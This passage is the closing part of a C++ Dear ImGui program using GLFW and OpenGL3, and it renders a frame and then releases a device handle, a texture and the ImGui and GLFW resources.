        glfwGetFramebufferSize(window, &display_w, &display_h);
        glViewport(0, 0, display_w, display_h);

        glClearColor(clear_color.x * clear_color.w, clear_color.y * clear_color.w, clear_color.z * clear_color.w, clear_color.w);
        glClear(GL_COLOR_BUFFER_BIT);

        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());

        glfwSwapBuffers(window);
    }
#ifdef __EMSCRIPTEN__
    EMSCRIPTEN_MAINLOOP_END;
#endif

    if (hdevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hdevice);
    }

    if (tex.id) {
        glDeleteTextures(1, &tex.id);
    }

    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();

    glfwDestroyWindow(window);
    glfwTerminate();

    return 0;
}
